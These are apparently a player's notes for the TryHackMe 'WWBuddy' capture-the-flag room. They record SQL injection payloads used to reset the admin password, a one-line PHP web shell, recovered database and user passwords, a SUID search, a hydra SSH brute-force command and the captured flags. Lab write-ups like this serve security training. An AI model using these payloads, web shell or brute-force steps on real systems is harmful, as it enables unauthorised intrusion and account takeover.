# WWBuddy 

> VOiD | Thursday 06 January 2022 02:22:14 PM UTC

My IP : 10.8.253.221
Target IP : 10.10.194.111


## PORT 80 [http]
```bash
fake creds : admin-helloworld
```
```sql
update table users set password = helloworld1 where user = 'admin'

	
update table users set password = helloworld1 where user = '' OR 1=1 -- -
```
```bash
 var users = 
 {"ebd66733bc9284004093aba1db46a653":"\" OR 1=1 -- +",
  "e33281d84095acb2b88bba2396c2ca67":"' OR 1=1 -- +",
  "be3308759688f3008d01a7ab12041198":"Henry",
  "b5ea6181006480438019e76f8100249e":"Roberto",
  "fc18e5f4aa09bbbb7fdedf5e277dda00":"WWBuddy"};


we have 3 users

/admin
<!--THM{d0nt_try_4nyth1ng_funny} -->
Hey Henry, i didn't made the admin functions for this page yet, but at least you can see who's trying to sniff into our site here.
192.168.0.139 2020-07-24 22:54:34 WWBuddy fc18e5f4aa09bbbb7fdedf5e277dda00
192.168.0.139 2020-07-24 22:56:09 Roberto b5ea6181006480438019e76f8100249e
10.8.253.221 2022-01-06 14:33:07 admin ebd66733bc9284004093aba1db46a653
10.8.253.221 2022-01-06 14:47:33 Roberto b5ea6181006480438019e76f8100249e 

it executes the php may be 

<?php system($_GET["cmd"]) ?>
```

## USER [www-data]
```bash
define('DB_SERVER', 'localhost');
define('DB_USERNAME', 'root');
define('DB_PASSWORD', 'password123');
define('DB_NAME', 'app');


2020-07-25T15:01:40.143760Z	   12 Execute	SELECT id, username, password FROM users WHERE username = 'RobertoyVnocsXsf%X68wf'
Roberto : yVnocsXsf%X68wf
```

## USER [roberto]
```bash
cat important.txt
Jenny will be very happy when she finds out she was hired :DD

Don't forget that next week she turns 26, when she sees the gift I bought her, maybe she'll even be excited to go on a date with me

find / -perm -4000 2>/dev/null


/bin/authenticate

hydra -l jenny -P wd.txt ssh://10.10.219.76
[22][ssh] host: 10.10.219.76   login: jenny   password: 08/03/1994

root@wwbuddy:/root# cat root.txt 
THM{ch4ng3_th3_3nv1r0nm3nt}


```
